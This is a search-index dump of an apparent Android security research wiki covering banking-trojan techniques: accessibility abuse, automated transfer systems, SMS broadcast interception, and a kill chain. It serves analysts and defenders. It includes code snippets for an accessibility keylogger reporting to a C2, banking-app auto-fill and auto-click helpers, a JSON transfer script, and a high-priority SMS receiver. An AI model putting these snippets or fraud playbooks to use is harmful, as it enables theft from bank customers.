{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"AWAKE","text":"<p>Android Wiki of Attacks, Knowledge &amp; Exploits</p> <p>Organized Android security research. Reversing, exploitation, malware analysis, and the techniques behind them.</p>"},{"location":"#about","title":"About","text":"<p>AWAKE documents how things work and how they break. It exists because Android security knowledge is spread across blog posts, conference slides, vendor reports, and dead links. This wiki structures that knowledge for researchers, reverse engineers, malware analysts, and penetration testers.</p>"},{"location":"#coverage","title":"Coverage","text":"Area Count Scope Malware Families 71 Banking trojans, spyware, RATs, toll fraud, state-sponsored -- from BankBot (2016) through BTMOB RAT (2025) Attack Techniques 11 Overlays, accessibility abuse, NFC relay, clipboard hijacking, tapjacking, WebView exploitation, and more Permissions 54 Runtime, special, and normal permissions documented with abuse scenarios and malware usage Reversing Methods 5 Static analysis, dynamic analysis, hooking, patching, network analysis Packers 3 Chinese packers, DexGuard, Virbox -- identification and unpacking Industry -- Security vendors and their roles in the mobile threat landscape"},{"location":"#start-here","title":"Start Here","text":"<p>Different roles need different entry points.</p> Role Start With Key Pages Malware Analyst Malware Families, Naming Conventions Static Analysis, Dynamic Analysis, Timeline Pentester Attack Techniques, Permissions Hooking, Overlay Attacks, Deep Link Exploitation Incident Responder Permissions (Special), Accessibility Abuse Malware Lineage Map, BIND_ACCESSIBILITY_SERVICE Researcher Naming Conventions, Timeline Industry, Resources, Malware Families"},{"location":"#coverage-highlights","title":"Coverage Highlights","text":"<p>Malware lineage tracking -- Five documented code lineages spanning 2016--2025, from BankBot through GodFather, Cerberus through Hook, and Exobot through Octo. Knowing the lineage predicts capabilities.</p> <p>NFC relay attacks -- NGate and GoldPickaxe use NFC relay to clone contactless payment cards. A newer attack vector that bypasses traditional banking security entirely.</p> <p>Clipboard hijacking -- SparkCat and SpyAgent target cryptocurrency seed phrases and wallet addresses through clipboard monitoring and OCR.</p> <p>MaaS economy -- Families like Hook, Ermac, and Octo operate as Malware-as-a-Service, rented on underground forums. The wiki tracks pricing, operator models, and how MaaS lowers the entry barrier.</p> <p>On-device fraud (ATS) -- Modern banking trojans (Xenomorph, Hook, ToxicPanda) perform automated transfers directly on the victim device using accessibility services, bypassing server-side fraud detection.</p> <p>State-sponsored tooling -- Pegasus, Predator, FinSpy, Hermit -- commercial spyware sold to governments, with documented exploit chains and deployment methods.</p>"},{"location":"#sections","title":"Sections","text":"Section Content Permissions Android permissions that can be abused: what they unlock, how malware uses them, what exploitation looks like Attack Techniques Overlay attacks, intent hijacking, accessibility abuse, WebView exploitation, organized by attack surface Malware Android malware families in chronological order, behavioral patterns, naming conventions across vendors Packers Commercial and custom Android packers: identification, protection mechanisms, unpacking Reversing Static analysis, dynamic analysis, hooking, patching: methodology and target-specific techniques Industry Mobile security companies and their roles Resources Curated links to blogs, tools, researchers, and conferences"},{"location":"attacks/","title":"Attack Techniques","text":"<p>Documented exploitation techniques targeting Android applications and the OS. Each technique covers what it is, the preconditions required, how it works in practice, real-world malware that uses it, and how it has evolved across Android versions.</p> <p>Organized by the Android component or mechanism being targeted.</p>"},{"location":"attacks/#techniques","title":"Techniques","text":"Technique Target Surface Key Permissions Overlay Attacks Window Manager <code>SYSTEM_ALERT_WINDOW</code> Accessibility Abuse Accessibility Service <code>BIND_ACCESSIBILITY_SERVICE</code> Screen Capture MediaProjection / Accessibility <code>FOREGROUND_SERVICE</code>, <code>BIND_ACCESSIBILITY_SERVICE</code> Keylogging InputMethodService / Accessibility <code>BIND_ACCESSIBILITY_SERVICE</code> SMS Interception SMS / BroadcastReceiver <code>RECEIVE_SMS</code>, <code>READ_SMS</code> Notification Listener Abuse NotificationListenerService <code>BIND_NOTIFICATION_LISTENER_SERVICE</code> Automated Transfer Systems Accessibility + Banking Apps <code>BIND_ACCESSIBILITY_SERVICE</code> Phishing Techniques UI / Social Engineering <code>SYSTEM_ALERT_WINDOW</code> (optional) C2 Communication Network / IPC <code>INTERNET</code> Dynamic Code Loading ClassLoader / Runtime None (app-private storage) Device Admin Abuse DevicePolicyManager <code>BIND_DEVICE_ADMIN</code> Persistence Techniques Services / Receivers <code>RECEIVE_BOOT_COMPLETED</code>, <code>FOREGROUND_SERVICE</code> Intent Hijacking Activities, Services None (component export) Deep Link Exploitation Activities None (URI scheme) WebView Exploitation WebView Varies Content Provider Attacks Content Providers None (provider export) Tapjacking Touch Events <code>SYSTEM_ALERT_WINDOW</code> Task Affinity Attacks Activity Stack None (manifest config) Broadcast Theft Broadcast Receivers Varies NFC Relay NFC / Host Card Emulation NFC (normal) Clipboard Hijacking ClipboardManager None (foreground) or <code>BIND_ACCESSIBILITY_SERVICE</code>"},{"location":"attacks/#kill-chain","title":"Kill Chain","text":"<p>How attacks chain together in a typical Android banking trojan or spyware operation. Each stage builds on the previous one.</p> Stage Objective Techniques / Permissions What Happens 1. Delivery Get on device Phishing, sideloading, Play Store dropper, smishing link APK delivered as fake app (Chrome update, Flash Player, bank app) 2. Dropper Install payload <code>REQUEST_INSTALL_PACKAGES</code>, Dynamic Code Loading Dropper downloads and installs the real malware APK at runtime 3. Persistence Survive reboots Persistence Techniques: <code>RECEIVE_BOOT_COMPLETED</code> + <code>FOREGROUND_SERVICE</code> Boot receiver re-launches malware; foreground service prevents kill 4. Privilege escalation Gain control Accessibility Abuse, Device Admin Abuse User tricked into enabling accessibility service or device admin; malware can now auto-grant permissions, read screens, inject input, resist uninstall 5. Credential theft Steal logins Overlay Attacks, Keylogging, Screen Capture, Clipboard Hijacking Phishing overlay injected over banking app, keystrokes captured, screen recorded, clipboard monitored for seed phrases 6. 2FA bypass Intercept OTPs SMS Interception, Notification Listener Abuse SMS OTPs intercepted via broadcast receiver or read from notification shade; push-based OTPs captured via notification listener 7. On-device fraud Move money Automated Transfer Systems ATS fills in transfer fields, confirms transactions, hides SMS confirmations 8. Exfiltration Send data to C2 C2 Communication: <code>INTERNET</code> Credentials, SMS, contacts, screen recordings sent to C2 over HTTP/WebSocket 9. Anti-analysis Avoid detection <code>QUERY_ALL_PACKAGES</code>, Device Admin Abuse Check for emulators/AV, abuse device admin to resist uninstall, wipe device on detection"},{"location":"attacks/#technique-combinations","title":"Technique Combinations","text":"<p>Attacks rarely operate alone. These are the most common pairings observed in active malware families.</p> Combination Result Families Using It Overlay + Accessibility Credential theft with ATS -- overlay steals creds, accessibility automates transfers Cerberus, Ermac, Hook, Xenomorph, Octo, GodFather, TsarBot Accessibility + Screen Capture Remote access / VNC -- accessibility provides input control, screen capture provides visual feed Hook, Octo, Vultur, BingoMod, Brokewell Accessibility + Keylogging Full input capture -- every keystroke and text field value recorded Cerberus, Ermac, TrickMo, SpyNote Accessibility + Clipboard Hijacking Crypto theft -- accessibility reads screen content, clipboard captures wallet addresses SparkCat, SpyAgent, Clipper variants Notification Listener + SMS Interception Complete OTP theft -- SMS receiver grabs text-based codes, notification listener catches push-based codes Anatsa, Xenomorph, GodFather Dynamic Code Loading + Phishing Dropper with clean initial scan -- benign APK passes Play Protect, downloads payload post-install Anatsa, SharkBot, Joker Device Admin + Persistence Unremovable malware -- device admin blocks uninstall, persistence survives reboots BRATA, Cerberus, Rafel RAT Overlay + Tapjacking Layered UI deception -- overlay captures input while tapjacking forces user interaction Anubis, BankBot (older families pre-Android 12) Accessibility + NFC Relay Contactless payment fraud -- accessibility extracts card PINs, NFC relay clones tap-to-pay NGate, GoldPickaxe Deep Links + WebView Token theft -- deep link redirects into malicious WebView that leaks auth tokens App-specific exploits, Mandrake Intent Hijacking + Broadcast Theft SMS interception -- hijack SMS broadcast to steal OTPs before the real app sees them FluBot, Anatsa, most banking trojans Accessibility + Content Provider Data exfiltration -- accessibility navigates apps, content provider queries extract stored data Spyware families (Pegasus, Predator)"},{"location":"attacks/#defense-priority","title":"Defense Priority","text":"<p>Ranked by prevalence in modern (2024-2025) Android malware. Priority reflects how frequently the technique appears in active campaigns and how much damage it enables.</p> Rank Technique Prevalence Why It Matters 1 Accessibility Abuse Nearly universal in banking trojans Enables everything: auto-granting permissions, reading screens, performing ATS, bypassing 2FA 2 Overlay Attacks High (banking trojans) Primary credential harvesting method; still effective despite Android restrictions 3 Screen Capture High (banking trojans, RATs) Real-time VNC and screen recording for credential theft and remote control 4 Keylogging High (banking trojans, spyware) Captures passwords and OTPs as users type; pairs with accessibility for full coverage 5 C2 Communication Universal Every malware family needs a command channel; multi-channel C2 is the norm 6 Persistence Techniques Universal (supporting) Required for any long-running operation; boot receivers and foreground services are baseline 7 Automated Transfer Systems High (banking trojans) On-device fraud that bypasses bank-side device fingerprinting and session checks 8 SMS Interception High (declining on newer OS) Original 2FA bypass method; restricted by Play Store policy but still used in sideloaded malware 9 Notification Listener Abuse High (rising) Replaced SMS interception as primary OTP theft vector; reads all app notifications 10 Dynamic Code Loading High (droppers) Foundation of Play Store evasion; clean APK downloads malicious payload post-install 11 Phishing Techniques High (delivery) Primary infection vector; smishing, fake Play Store pages, social engineering for permissions 12 Clipboard Hijacking Rising (crypto-targeting) Growing alongside cryptocurrency adoption; minimal permissions required from foreground 13 NFC Relay Emerging Bypasses contactless payment security entirely; hard to detect at the device level 14 Device Admin Abuse Moderate (declining) Prevents uninstall and enables device wipe; being replaced by accessibility-based persistence 15 Intent Hijacking Moderate Enables SMS/OTP theft and IPC interception; foundational for many attack chains 16 WebView Exploitation Moderate Targets hybrid apps; token theft, JavaScript injection, MITM within the app 17 Broadcast Theft Moderate (declining) SMS interception still works but restricted on newer Android versions 18 Deep Link Exploitation Moderate OAuth redirect attacks, app navigation hijacking; underestimated in mobile pentests 19 Tapjacking Low (declining) Largely mitigated by <code>filterTouchesWhenObscured</code> and Android 12+ restrictions 20 Task Affinity Attacks Low Niche but effective for targeted phishing within the task switcher 21 Content Provider Attacks Low App-specific; dangerous when providers are exported without proper permissions"},{"location":"attacks/accessibility-abuse/","title":"Accessibility Abuse","text":"<p>Using Android's accessibility framework to control the device programmatically. An accessibility service can read any screen, click any button, type into any field, and perform any gesture. This gives malware full device control without exploiting any vulnerability: the framework works exactly as designed, just not for its intended purpose.</p> <p>See also: <code>BIND_ACCESSIBILITY_SERVICE</code> for the permission details.</p>"},{"location":"attacks/accessibility-abuse/#requirements","title":"Requirements","text":"Requirement Details Permission <code>BIND_ACCESSIBILITY_SERVICE</code> (granted via Settings toggle) Social Engineering Convince user to enable the service <p>No exploit needed. The hardest part is getting the user to the Settings toggle and convincing them to enable it. Malware typically uses fake overlay dialogs (\"Enable this service to continue\", \"Battery optimization required\", \"Accessibility update needed\").</p>"},{"location":"attacks/accessibility-abuse/#attack-capabilities","title":"Attack Capabilities","text":""},{"location":"attacks/accessibility-abuse/#keylogging","title":"Keylogging","text":"<p>Accessibility services receive <code>TYPE_VIEW_TEXT_CHANGED</code> events containing the text entered in any field across any app.</p> <pre><code>@Override\npublic void onAccessibilityEvent(AccessibilityEvent event) {\n    if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {\n        String text = event.getText().toString();\n        String packageName = event.getPackageName().toString();\n        sendToC2(packageName, text);\n    }\n}\n</code></pre>"},{"location":"attacks/accessibility-abuse/#auto-granting-permissions","title":"Auto-Granting Permissions","text":"<p>The malware navigates the system UI to grant itself additional permissions:</p> <ol> <li>Open Settings via intent</li> <li>Traverse the view tree to find \"Allow\" or toggle buttons</li> <li>Perform <code>ACTION_CLICK</code> on the target node</li> <li>Repeat for each permission needed</li> </ol> <p>This effectively escalates from one permission (accessibility) to all permissions.</p>"},{"location":"attacks/accessibility-abuse/#on-device-fraud-ats","title":"On-Device Fraud (ATS)","text":"<p>Automated Transfer System: the malware operates the real banking app to initiate transfers. Steps:</p> <ol> <li>Wait for user to log into banking app (or use stolen credentials via overlay)</li> <li>Navigate to transfer screen using accessibility gestures</li> <li>Fill in attacker-controlled recipient and amount</li> <li>Confirm the transaction</li> <li>Intercept OTP from notification and enter it</li> </ol> <p>The user's device is locked or shows a fake \"updating\" screen during the process. The transaction happens through the legitimate banking app, making it harder for bank-side fraud detection to flag.</p>"},{"location":"attacks/accessibility-abuse/#anti-removal","title":"Anti-Removal","text":"<p>The malware prevents its own uninstallation:</p> <ul> <li>Monitors for navigation to Settings &gt; Apps &gt; [malware]</li> <li>When detected, performs <code>GLOBAL_ACTION_HOME</code> or <code>GLOBAL_ACTION_BACK</code> to exit Settings</li> <li>Can also click \"Cancel\" on uninstall confirmation dialogs</li> <li>Some families lock the screen and display a persistent overlay</li> </ul>"},{"location":"attacks/accessibility-abuse/#notification-interception","title":"Notification Interception","text":"<p>With <code>flagRetrieveInteractiveWindows</code>, the accessibility service can read notification content from any app, functioning as an alternative to <code>BIND_NOTIFICATION_LISTENER_SERVICE</code>.</p>"},{"location":"attacks/accessibility-abuse/#screen-streaming-vnc","title":"Screen Streaming / VNC","text":"<p>Some families (Hook, Octo) use accessibility events to build a real-time representation of the screen and stream it to the attacker, creating a VNC-like remote access capability.</p>"},{"location":"attacks/accessibility-abuse/#malware-families-by-accessibility-capability","title":"Malware Families by Accessibility Capability","text":"Family Keylog ATS Anti-Remove Screen Stream Auto-Grant Anatsa Yes Yes Yes No Yes Cerberus Yes No Yes No Yes Hook Yes Yes Yes Yes (VNC) Yes Octo Yes Yes Yes Yes Yes SharkBot No Yes Yes No Yes Xenomorph Yes Yes Yes No Yes Medusa Yes No Yes Yes Yes BianLian Yes No Yes Yes Yes"},{"location":"attacks/accessibility-abuse/#encrypted-messaging-interception","title":"Encrypted Messaging Interception","text":"<p>A technique introduced by Sturnus in 2025 that exploits a fundamental weakness in encrypted messaging apps: messages must be decrypted for display. The accessibility service reads message content after the messaging app has already decrypted it for the user's screen.</p> <p>This works against WhatsApp, Telegram, Signal, and any app that renders plaintext on the device UI. The malware monitors <code>TYPE_VIEW_TEXT_CHANGED</code> and <code>TYPE_WINDOW_CONTENT_CHANGED</code> events from target messaging packages, capturing message text, sender info, and timestamps. End-to-end encryption provides no protection because the interception occurs after decryption, at the presentation layer.</p>"},{"location":"attacks/accessibility-abuse/#human-behavior-mimicry","title":"Human Behavior Mimicry","text":"<p>Herodotus introduced typing delays and natural gesture patterns during ATS operations to evade behavioral biometric systems that banks deploy to detect automated device interaction. Rather than filling form fields instantly (a signal that fraud detection systems flag), the malware types characters with randomized inter-keystroke timing and performs swipe gestures at human-plausible speeds.</p>"},{"location":"attacks/accessibility-abuse/#custom-keyboard-keylogging","title":"Custom Keyboard Keylogging","text":"<p>BlankBot and Frogblight implement a custom <code>InputMethodService</code> (IME) that replaces the device keyboard. Once the malware's keyboard is set as default, every keystroke across every app passes through it. Unlike standard accessibility keylogging which captures text change events after the fact, a custom keyboard intercepts each key press directly, capturing passwords, PINs, and messages including characters deleted before submission.</p> <p>The malware uses accessibility to silently navigate to Settings &gt; Language &amp; Input and switch the default keyboard to its own IME without user awareness. On some Android versions, this can be done entirely through accessibility gestures.</p>"},{"location":"attacks/accessibility-abuse/#fake-lockscreen-pin-capture","title":"Fake Lockscreen PIN Capture","text":"<p>TrickMo and TsarBot display a full-screen overlay that replicates the device's lockscreen. When the device \"appears\" to lock, the user enters their PIN or pattern into the malware's fake lockscreen rather than the real one. The captured PIN enables the attacker to unlock the device during remote access sessions. This is distinct from banking overlay phishing since it targets the device unlock credential rather than app-specific credentials.</p>"},{"location":"attacks/accessibility-abuse/#contact-list-injection","title":"Contact List Injection","text":"<p>Crocodilus uses accessibility to add entries to the device's contact list, inserting attacker-controlled phone numbers labeled as \"Bank Support\" or similar. When the victim later needs to contact their bank, they find the injected contact and call the attacker directly. This extends the accessibility attack surface beyond the device into social engineering.</p>"},{"location":"attacks/accessibility-abuse/#social-engineering-to-enable","title":"Social Engineering to Enable","text":"<p>Common lures used to get users to the accessibility settings:</p> Lure Approach \"Accessibility update required\" Fake system dialog \"Battery optimization\" Overlay directing user to enable service \"Security scan\" Fake antivirus requiring accessibility \"Enable to continue\" App refuses to function until enabled \"Google Chrome update\" Impersonates Chrome update process"},{"location":"attacks/accessibility-abuse/#android-mitigations-over-time","title":"Android Mitigations Over Time","text":"Version Change Impact Android 11 <code>isAccessibilityTool</code> metadata required for visibility Only affects apps targeting API 30+ Android 13 Restricted settings for sideloaded apps Bypassed by session-based installers Android 13 Accessibility shortcut warning improved Users still click through Android 15 Expanded restricted settings Closes some session-installer loopholes <p>The fundamental problem remains: there is no technical way to distinguish a malicious accessibility service from a legitimate one at install time. The capability is inherent to the API.</p>"},{"location":"attacks/accessibility-abuse/#families-using-this-technique","title":"Families Using This Technique","text":"Family Primary Accessibility Abuse Cerberus Keylogging Anatsa ATS Hook Screen streaming Ermac Overlay trigger SharkBot ATS Gustuff ATS Xenomorph ATS Octo Screen streaming Hydra Overlay trigger Medusa Screen streaming Vultur Screen streaming GodFather Overlay trigger Chameleon Permission escalation Copybara ATS FluBot Permission escalation MoqHao Auto-execution, permission escalation Zanubis ATS Mamont Permission escalation SoumniBot Data theft Crocodilus Full DTO, contact list injection Herodotus ATS with human behavior mimicry Sturnus Encrypted messaging interception RatOn ATS + NFC relay Klopatra ATS BingoMod VNC-based DTO Brokewell Screen streaming, ATS Albiriox ATS NGate Permission escalation GoldPickaxe Facial biometric capture SpyNote Keylogging, anti-removal Antidot ATS, keylogging TrickMo Keylogging, fake lockscreen PIN capture TsarBot ATS, fake lockscreen PIN capture BlankBot Custom keyboard keylogging Frogblight Custom keyboard keylogging ToxicPanda ATS BTMOB RAT Credential harvesting, auto-grant Rafel RAT Anti-removal, notification siphoning Gigabud Screen recording trigger, automated payments PJobRAT Data exfiltration BlankBot Custom keyboard keylogging Frogblight Custom keyboard keylogging ToxicPanda ATS Rafel RAT Keylogging, device control Vultur Screen streaming DeVixor Remote access via accessibility FireScam Notification monitoring"},{"location":"attacks/automated-transfer-systems/","title":"Automated Transfer Systems (ATS)","text":"<p>On-device fraud that automates money transfers without user interaction. Rather than stealing credentials and replaying them from an attacker-controlled device, ATS operates the victim's real banking app directly using accessibility services. The transaction originates from the victim's trusted device, IP address, and session -- making it nearly invisible to bank-side fraud detection.</p> <p>See also: Accessibility Abuse, Overlay Attacks</p>"},{"location":"attacks/automated-transfer-systems/#requirements","title":"Requirements","text":"Requirement Details Permission <code>BIND_ACCESSIBILITY_SERVICE</code> Banking App Target banking app installed and authenticated Configuration Recipient account, transfer amount, app-specific UI navigation script"},{"location":"attacks/automated-transfer-systems/#ats-vs-overlay-vs-vnc","title":"ATS vs Overlay vs VNC","text":"<p>Three distinct approaches to banking fraud, often combined within a single family.</p> Aspect Overlay ATS VNC / RAT Where fraud happens Attacker's device (credentials exfiltrated) Victim's device (automated) Victim's device (remote-controlled) Credential exfiltration Yes -- sent to C2 Not required (uses existing session) Optional Detection by bank Different device/IP/fingerprint Same device, same session Same device, same session Operator involvement Manual (attacker logs in remotely) None (fully scripted) Manual (attacker controls device live) Scalability Moderate (requires human operators) High (runs unattended) Low (1:1 operator-to-victim ratio) Behavioral biometrics Fails (different typing/interaction patterns) Can mimic human behavior Partially detectable"},{"location":"attacks/automated-transfer-systems/#how-ats-works","title":"How ATS Works","text":""},{"location":"attacks/automated-transfer-systems/#the-transfer-workflow","title":"The Transfer Workflow","text":"<ol> <li>Wait for authentication -- the malware waits for the user to log into the banking app, or triggers the app open and uses previously stolen credentials via overlay</li> <li>Navigate to transfer screen -- accessibility gestures scroll, tap menu items, and navigate to the money transfer section</li> <li>Fill transfer fields -- the recipient IBAN/account and amount are injected into text fields using <code>AccessibilityNodeInfo.ACTION_SET_TEXT</code></li> <li>Confirm transaction -- the malware clicks through confirmation dialogs, including \"Are you sure?\" screens</li> <li>Handle 2FA -- intercepts SMS OTP from notifications or reads it via <code>NotificationListenerService</code>, then enters it into the confirmation field</li> <li>Clean up -- deletes confirmation SMS, dismisses push notifications from the bank, clears recent transactions view if possible</li> </ol>"},{"location":"attacks/automated-transfer-systems/#anti-detection-during-transfer","title":"Anti-Detection During Transfer","text":"<p>ATS families employ stealth measures to prevent the user from noticing the fraud in progress:</p> Technique Purpose Implementation Screen brightness to 0 User cannot see device activity <code>Settings.System.SCREEN_BRIGHTNESS</code> set to 0 Mute all audio Suppress notification sounds <code>AudioManager.setStreamMute()</code> on all streams Enable Do Not Disturb Block incoming calls/notifications during transfer <code>NotificationManager.setInterruptionFilter()</code> Black overlay Cover screen with opaque window <code>TYPE_APPLICATION_OVERLAY</code> with <code>Color.BLACK</code> Fake \"updating\" screen Explain device unresponsiveness Overlay displaying \"System update in progress...\" Disable notifications Prevent bank alerts during transfer Accessibility dismisses notifications as they arrive Lock user out Prevent interference mid-transfer Custom lock screen overlay or <code>GLOBAL_ACTION_LOCK_SCREEN</code>"},{"location":"attacks/automated-transfer-systems/#scripting-engines","title":"Scripting Engines","text":"<p>Early ATS implementations were hardcoded per banking app. Modern families use configurable scripting systems.</p> <p>Xenomorph v3 ATS Engine: introduced a JSON-based scripting language that defines UI navigation as a sequence of operations. Scripts are downloaded from C2 per target app, making it possible to add new bank targets without updating the malware binary.</p> <pre><code>{\n  \"module\": \"ats\",\n  \"target\": \"com.target.bankapp\",\n  \"steps\": [\n    {\"action\": \"open_app\", \"package\": \"com.target.bankapp\"},\n    {\"action\": \"wait\", \"condition\": \"text_visible\", \"value\": \"Transfer\"},\n    {\"action\": \"click\", \"selector\": {\"text\": \"Transfer\"}},\n    {\"action\": \"set_text\", \"selector\": {\"id\": \"recipient_field\"}, \"value\": \"&lt;iban&gt;\"},\n    {\"action\": \"set_text\", \"selector\": {\"id\": \"amount_field\"}, \"value\": \"&lt;amount&gt;\"},\n    {\"action\": \"click\", \"selector\": {\"text\": \"Confirm\"}},\n    {\"action\": \"wait\", \"condition\": \"text_visible\", \"value\": \"SMS code\"},\n    {\"action\": \"set_text\", \"selector\": {\"id\": \"otp_field\"}, \"value\": \"&lt;intercepted_sms&gt;\"}\n  ]\n}\n</code></pre> <p>SharkBot: uses a similar declarative approach where each target bank has a configuration defining the UI element IDs, button text, and navigation paths. The C2 pushes updated configs when banking apps change their UI.</p> <p>Hook / Octo: instead of scripted ATS, these families provide full VNC-based remote access, letting the operator navigate the banking app manually. This is more flexible but less scalable.</p>"},{"location":"attacks/automated-transfer-systems/#bypassing-transaction-limits","title":"Bypassing Transaction Limits","text":"<p>Banks enforce per-transaction and daily transfer limits. ATS handles this by:</p> <ul> <li>Splitting transfers -- breaking a large amount into multiple smaller transfers below the per-transaction threshold</li> <li>Modifying beneficiary lists -- adding the mule account to the trusted recipient list first (some banks skip 2FA for trusted recipients)</li> <li>Timing across days -- spreading transfers across multiple days to stay under daily limits</li> <li>Draining all accounts -- iterating through savings, checking, and linked accounts</li> </ul>"},{"location":"attacks/automated-transfer-systems/#account-takeover-workflow","title":"Account Takeover Workflow","text":"<p>A full ATS-driven account takeover chains multiple techniques:</p> <ol> <li>Victim installs dropper from phishing SMS or Play Store</li> <li>Dropper requests accessibility permission via social engineering overlay</li> <li>Malware uses accessibility to auto-grant all additional permissions</li> <li>Overlay phishes banking credentials when user opens banking app</li> <li>Malware waits for idle period (typically 2-4 AM local time)</li> <li>ATS opens banking app, authenticates with stolen credentials</li> <li>ATS changes registered phone number and email to attacker-controlled values</li> <li>ATS initiates transfer, intercepts OTP, confirms transaction</li> <li>ATS repeats until accounts are drained or limits are hit</li> <li>Some families wipe the device post-fraud to destroy evidence (BRATA, BingoMod)</li> </ol>"},{"location":"attacks/automated-transfer-systems/#families-with-ats-capability","title":"Families With ATS Capability","text":"Family ATS Type Scripting First ATS Version Targets Gustuff Scripted Hardcoded per app 2019 Australian banks Cerberus Scripted Hardcoded v2 (2020) European banks SharkBot Scripted JSON config v1 (2021) EU/UK banks Anatsa Scripted Configurable 2021 EU/US banks Ermac Scripted Hardcoded v2 (2022) 400+ targets Xenomorph Scripted JSON ATS engine v3 (2023) 400+ targets Hook VNC + ATS Operator-assisted 2023 400+ targets Octo VNC + ATS Operator-assisted v2 (2023) 200+ targets GodFather Scripted Configurable v2 (2023) 400+ targets Medusa VNC-based Operator-controlled v2 (2024) European banks BingoMod VNC + scripted Hybrid 2024 Italian banks TsarBot Scripted Configurable 2024 750+ targets Copybara VNC + scripted Hybrid 2024 Italian banks Herodotus Scripted Human behavior mimicry 2025 EU banks"},{"location":"attacks/automated-transfer-systems/#accessibility-code-for-ats","title":"Accessibility Code for ATS","text":"<p>Core accessibility operations used in ATS:</p> <pre><code>public void fillField(AccessibilityNodeInfo root, String viewId, String value) {\n    List&lt;AccessibilityNodeInfo&gt; nodes = root.findAccessibilityNodeInfosByViewId(viewId);\n    if (!nodes.isEmpty()) {\n        Bundle args = new Bundle();\n        args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, value);\n        nodes.get(0).performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);\n    }\n}\n\npublic void clickButton(AccessibilityNodeInfo root, String buttonText) {\n    List&lt;AccessibilityNodeInfo&gt; nodes = root.findAccessibilityNodeInfosByText(buttonText);\n    for (AccessibilityNodeInfo node : nodes) {\n        if (node.isClickable()) {\n            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);\n            return;\n        }\n        AccessibilityNodeInfo parent = node.getParent();\n        if (parent != null &amp;&amp; parent.isClickable()) {\n            parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);\n            return;\n        }\n    }\n}\n\npublic void navigateToTransfer(AccessibilityService service) {\n    Intent intent = service.getPackageManager()\n        .getLaunchIntentForPackage(\"com.target.bankapp\");\n    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);\n    service.startActivity(intent);\n}\n</code></pre>"},{"location":"attacks/automated-transfer-systems/#android-version-impact","title":"Android Version Impact","text":"Version Restriction ATS Impact Android 7 Background execution limits Minimal -- accessibility runs as foreground service Android 10 Background activity launch restrictions ATS must wait for user interaction or use <code>USE_FULL_SCREEN_INTENT</code> Android 13 Restricted settings for sideloaded apps Accessibility harder to enable -- bypassed via session-based install Android 13 Non-dismissible notification for active accessibility User may notice -- malware hides behind legitimate-looking service name Android 14 Accessibility declaration restrictions Apps must declare specific accessibility capabilities Android 15 Expanded restricted settings enforcement Closes session-installer bypass for some OEMs <p>The fundamental limitation remains: once accessibility is granted, there is no OS-level mechanism to distinguish ATS operations from legitimate accessibility tool usage. The permission model is all-or-nothing.</p>"},{"location":"attacks/automated-transfer-systems/#detection-during-analysis","title":"Detection During Analysis","text":"<p>Static indicators:</p> <ul> <li>Accessibility service config requesting <code>flagDefault</code> or <code>flagRetrieveInteractiveWindows</code></li> <li>References to banking app package names in strings or assets</li> <li><code>ACTION_SET_TEXT</code> and <code>ACTION_CLICK</code> usage patterns on <code>AccessibilityNodeInfo</code></li> <li>JSON/XML configuration files mapping package names to UI navigation sequences</li> <li><code>AudioManager</code>, <code>Settings.System.SCREEN_BRIGHTNESS</code> manipulation</li> </ul> <p>Dynamic indicators:</p> <ul> <li>Accessibility service performing actions while screen is off or brightness is 0</li> <li>Automated navigation through banking app UI at non-human speeds</li> <li>SMS read/delete operations immediately following a transfer confirmation</li> <li>Network traffic to C2 containing transaction confirmation details</li> </ul> <p>Frida hook to intercept ATS actions:</p> <pre><code>Java.perform(function() {\n    var ANI = Java.use(\"android.view.accessibility.AccessibilityNodeInfo\");\n    ANI.performAction.overload(\"int\", \"android.os.Bundle\").implementation = function(action, args) {\n        if (action === 0x200000) {\n            console.log(\"[ATS] SET_TEXT: \" + args.getCharSequence(\"ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE\"));\n        }\n        if (action === 0x10) {\n            console.log(\"[ATS] CLICK on: \" + this.getViewIdResourceName());\n        }\n        return this.performAction(action, args);\n    };\n});\n</code></pre>"},{"location":"attacks/broadcast-theft/","title":"Broadcast Theft","text":"<p>Intercepting broadcast intents meant for other apps. Android's broadcast system sends messages to all registered receivers. If a broadcast carries sensitive data and isn't properly protected, any app can register a receiver and read it.</p>"},{"location":"attacks/broadcast-theft/#requirements","title":"Requirements","text":"Requirement Details Permission Varies. Some broadcasts require permissions (e.g., <code>RECEIVE_SMS</code>). Others are unprotected. Condition Target broadcast is not permission-protected or is ordered"},{"location":"attacks/broadcast-theft/#how-broadcasts-work","title":"How Broadcasts Work","text":"<p>An app sends a broadcast, and all registered <code>BroadcastReceiver</code> components matching the intent filter receive it. Two types:</p> <p>Normal broadcasts (<code>sendBroadcast()</code>): delivered to all receivers simultaneously. No ordering, no priority, no ability to cancel.</p> <p>Ordered broadcasts (<code>sendOrderedBroadcast()</code>): delivered sequentially by priority. Higher-priority receivers run first and can modify or cancel the broadcast before lower-priority receivers see it.</p>"},{"location":"attacks/broadcast-theft/#attack-patterns","title":"Attack Patterns","text":""},{"location":"attacks/broadcast-theft/#sms-interception","title":"SMS Interception","text":"<p>The <code>SMS_RECEIVED</code> broadcast is ordered. Malware registers a receiver with maximum priority:</p> <pre><code>&lt;receiver android:name=\".SmsReceiver\" android:exported=\"true\"&gt;\n    &lt;intent-filter android:priority=\"999\"&gt;\n        &lt;action android:name=\"android.provider.Telephony.SMS_RECEIVED\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/receiver&gt;\n</code></pre> <p>The malware receives the SMS first, extracts the OTP, and can call <code>abortBroadcast()</code> to prevent the default SMS app from showing it. The user never sees the message.</p> <p>On Android 4.4+, only the default SMS app can abort SMS broadcasts, but malware can still read the content and forward it without aborting.</p>"},{"location":"attacks/broadcast-theft/#sticky-broadcast-leakage","title":"Sticky Broadcast Leakage","text":"<p>Sticky broadcasts (deprecated in API 21) persist after being sent. Any app calling <code>registerReceiver()</code> with the matching filter receives the last sticky broadcast. This was used to leak battery status, charging state, and other system info.</p> 